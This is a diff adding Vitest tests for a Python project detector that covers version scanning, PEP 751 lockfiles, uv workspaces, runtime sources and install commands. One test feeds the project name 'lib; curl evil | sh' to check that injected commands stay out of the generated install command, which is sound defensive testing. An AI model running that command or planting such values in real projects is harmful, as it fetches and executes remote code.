@@ -1,3 +1,4 @@
+import * as path from 'node:path'
 import { afterEach, describe, expect, it } from 'vitest'
 import { pythonDetector } from '../src/detectors/python.js'
 import { cleanup, makeProject } from './helpers.js'
@@ -193,5 +194,166 @@ path = "src/h/__about__.py"
     const result = await pythonDetector.detect({ dir })
     expect(result?.version).toBe('')
     expect(result?.versionSource).toBe('')
+  })
+})
+
+describe('pythonDetector: __version__ scan', () => {
+  // Regression: a depth-3 walk picked up the version of a vendored library.
+  it('ignores packages in third_party/, vendor/, tests/ and similar directories', async () => {
+    const dir = await project({
+      'requirements.txt': 'flask\n',
+      'app.py': 'print(1)\n',
+      'third_party/oldlib/__init__.py': '__version__ = "0.0.7"\n',
+      'tests/__init__.py': '__version__ = "9.9.9"\n',
+      'src/vendor/__init__.py': '__version__ = "8.8.8"\n',
+    })
+    expect(await pythonDetector.detect({ dir })).toMatchObject({ version: '', versionSource: '' })
+  })
+
+  it('does not look into nested packages', async () => {
+    const dir = await project({ 'requirements.txt': '', 'lib/deep/pkg/__init__.py': '__version__ = "0.0.1"\n' })
+    expect((await pythonDetector.detect({ dir }))?.version).toBe('')
+  })
+
+  it('uses the only top-level package when the project name does not match it', async () => {
+    const dir = await project({
+      'pyproject.toml': '[project]\nname = "my-tool"\ndynamic = ["version"]\n',
+      'src/mytool/__init__.py': '',
+      'src/mytool/_version.py': '__version__ = "1.3.0"\n',
+    })
+    expect(await pythonDetector.detect({ dir })).toMatchObject({ version: '1.3.0', versionSource: 'src/mytool/_version.py' })
+  })
+
+  it('reports nothing when several top-level packages make the guess ambiguous', async () => {
+    const dir = await project({
+      'requirements.txt': '',
+      'alpha/__init__.py': '__version__ = "1.0.0"\n',
+      'beta/__init__.py': '__version__ = "2.0.0"\n',
+    })
+    expect((await pythonDetector.detect({ dir }))?.version).toBe('')
+  })
+
+  it('still prefers the package named after the project among several', async () => {
+    const dir = await project({
+      'setup.cfg': '[metadata]\nname = my.app\n',
+      'my_app/__init__.py': '__version__ = "5.1.0"\n',
+      'helpers/__init__.py': '__version__ = "0.1.0"\n',
+    })
+    expect(await pythonDetector.detect({ dir })).toMatchObject({ version: '5.1.0', versionSource: 'my_app/__init__.py' })
+  })
+})
+
+describe('pythonDetector: lockfiles', () => {
+  // Regression: PEP 751 lock files were not recognised.
+  it.each(['pylock.toml', 'pylock.dev.toml'])('recognises %s', async (lock) => {
+    const dir = await project({ 'pyproject.toml': '[project]\nname="a"\nversion="1"\n', [lock]: 'lock-version = "1.0"\n' })
+    expect(await pythonDetector.detect({ dir })).toMatchObject({ lockfile: lock, packageManager: 'pip', cacheDependencyPath: lock })
+  })
+
+  it('lets a tool-specific lockfile and tool tables decide the package manager over pylock.toml', async () => {
+    const both = await project({ 'pyproject.toml': '[project]\nname="a"\n', 'uv.lock': '', 'pylock.toml': '' })
+    expect(await pythonDetector.detect({ dir: both })).toMatchObject({ lockfile: 'uv.lock', packageManager: 'uv' })
+    const pdm = await project({ 'pyproject.toml': '[project]\nname="a"\n[tool.pdm]\n', 'pylock.toml': '' })
+    expect(await pythonDetector.detect({ dir: pdm })).toMatchObject({ lockfile: 'pylock.toml', packageManager: 'pdm' })
+  })
+
+  it('ignores names that are not PEP 751 lock files', async () => {
+    const dir = await project({ 'requirements.txt': '', 'pylock.a.b.toml': '', 'pylock.toml.bak': '' })
+    expect((await pythonDetector.detect({ dir }))?.lockfile).toBe('')
+  })
+})
+
+describe('pythonDetector: uv workspaces', () => {
+  const workspace = {
+    'pyproject.toml': '[project]\nname="ws"\nversion="0"\nrequires-python=">=3.11"\n[tool.uv]\nrequired-version=">=0.6"\n[tool.uv.workspace]\nmembers=["pkgs/*"]\nexclude=["pkgs/legacy"]\n',
+    'uv.lock': 'version = 1\n',
+    '.python-version': '3.12\n',
+    'pkgs/lib/pyproject.toml': '[project]\nname="lib"\nversion="1.1.0"\n',
+    'pkgs/legacy/pyproject.toml': '[project]\nname="legacy"\nversion="0.1.0"\n',
+  }
+
+  // Regression: members of a uv workspace were reported as pip without lockfile or runtime.
+  it('inherits uv, the lockfile and the runtime from the workspace root', async () => {
+    const root = await project(workspace)
+    expect(await pythonDetector.detect({ dir: path.join(root, 'pkgs/lib'), boundary: root })).toMatchObject({
+      name: 'lib',
+      version: '1.1.0',
+      packageManager: 'uv',
+      packageManagerVersion: '>=0.6',
+      lockfile: '../../uv.lock',
+      languageVersion: '3.12',
+      languageVersionSource: '../../.python-version',
+      languageVersionFile: '../../.python-version',
+      workspaceRoot: '../..',
+      installCommand: 'uv sync --locked --package lib',
+      cacheDependencyPath: '../../uv.lock',
+    })
+  })
+
+  it('never puts an invalid project name into the install command', async () => {
+    const root = await project({ ...workspace, 'pkgs/lib/pyproject.toml': '[project]\nname="lib; curl evil | sh"\nversion="1"\n' })
+    expect((await pythonDetector.detect({ dir: path.join(root, 'pkgs/lib'), boundary: root }))?.installCommand).toBe('uv sync --locked')
+  })
+
+  it('falls back to the workspace root requires-python', async () => {
+    const { '.python-version': _pin, ...withoutPin } = workspace
+    const root = await project(withoutPin)
+    expect(await pythonDetector.detect({ dir: path.join(root, 'pkgs/lib'), boundary: root })).toMatchObject({
+      languageVersion: '>=3.11',
+      languageVersionSource: '../../pyproject.toml:project.requires-python',
+      languageVersionFile: '../../pyproject.toml',
+    })
+  })
+
+  it('does not treat excluded or non-member directories as workspace members', async () => {
+    const root = await project({ ...workspace, 'scripts/tool/requirements.txt': 'rich\n' })
+    expect(await pythonDetector.detect({ dir: path.join(root, 'pkgs/legacy'), boundary: root })).toMatchObject({
+      packageManager: 'pip',
+      lockfile: '',
+      workspaceRoot: '.',
+      installCommand: 'pip install .',
+      languageVersion: '3.12',
+    })
+    expect(await pythonDetector.detect({ dir: path.join(root, 'scripts/tool'), boundary: root })).toMatchObject({
+      packageManager: 'pip',
+      installCommand: 'pip install -r requirements.txt',
+      cacheDependencyPath: 'requirements.txt',
+    })
+  })
+})
+
+describe('pythonDetector: runtime source', () => {
+  it.each([
+    [{ 'pyproject.toml': '[project]\nname="a"\nrequires-python=">=3.10,<3.13"\n' }, '>=3.10,<3.13', 'pyproject.toml:project.requires-python', 'pyproject.toml'],
+    // setup-python ignores Poetry's python dependency when a [project] table exists.
+    [{ 'pyproject.toml': '[project]\nname="a"\n[tool.poetry.dependencies]\npython="^3.11"\n' }, '^3.11', 'pyproject.toml:tool.poetry.dependencies.python', ''],
+    [{ 'pyproject.toml': '[tool.poetry]\nname="a"\n[tool.poetry.dependencies]\npython="^3.11"\n' }, '^3.11', 'pyproject.toml:tool.poetry.dependencies.python', 'pyproject.toml'],
+    [{ Pipfile: '[requires]\npython_full_version = "3.12.1"\npython_version = "3.12"\n' }, '3.12.1', 'Pipfile:requires.python_full_version', 'Pipfile'],
+    [{ 'setup.cfg': '[options]\npython_requires = >=3.9\n' }, '>=3.9', 'setup.cfg:options.python_requires', ''],
+    [{ 'requirements.txt': '', 'runtime.txt': 'python-3.11.9\n' }, '3.11.9', 'runtime.txt', ''],
+    [{ 'requirements.txt': '', '.tool-versions': 'python 3.13.0\n' }, '3.13.0', '.tool-versions', '.tool-versions'],
+    [{ 'requirements.txt': '', 'mise.toml': '[tools]\npython = "3.13"\n' }, '3.13', 'mise.toml:tools.python', ''],
+    [{ 'requirements.txt': '', '.python-version': '3.12.4\n' }, '3.12.4', '.python-version', '.python-version'],
+  ])('%j', async (files, version, source, file) => {
+    const dir = await project(files)
+    expect(await pythonDetector.detect({ dir })).toMatchObject({ languageVersion: version, languageVersionSource: source, languageVersionFile: file })
+  })
+})
+
+describe('pythonDetector: install command and cache path', () => {
+  it.each([
+    [{ 'pyproject.toml': '[project]\nname="a"\n', 'uv.lock': '' }, 'uv sync --locked', 'uv.lock'],
+    [{ 'pyproject.toml': '[project]\nname="a"\n[tool.uv]\n' }, 'uv sync', 'pyproject.toml'],
+    [{ 'pyproject.toml': '[tool.poetry]\nname="a"\n', 'poetry.lock': '' }, 'poetry install', 'poetry.lock'],
+    [{ 'pyproject.toml': '[project]\nname="a"\n', 'pdm.lock': '' }, 'pdm sync', 'pdm.lock'],
+    [{ 'pyproject.toml': '[project]\nname="a"\n[tool.pdm]\n' }, 'pdm install', 'pyproject.toml'],
+    [{ 'pyproject.toml': '[project]\nname="a"\n[tool.hatch.envs.default]\n' }, 'hatch env create', 'pyproject.toml'],
+    [{ Pipfile: '', 'Pipfile.lock': '{}' }, 'pipenv install --deploy', 'Pipfile.lock'],
+    [{ Pipfile: '' }, 'pipenv install', 'Pipfile'],
+    [{ 'pyproject.toml': '[project]\nname="a"\n', 'requirements.txt': '' }, 'pip install -r requirements.txt', 'requirements.txt'],
+    [{ 'setup.py': 'setup()\n' }, 'pip install .', 'setup.py'],
+  ])('%j → %s', async (files, command, cache) => {
+    const dir = await project(files)
+    expect(await pythonDetector.detect({ dir })).toMatchObject({ installCommand: command, cacheDependencyPath: cache, workspaceRoot: '.' })
   })
 })
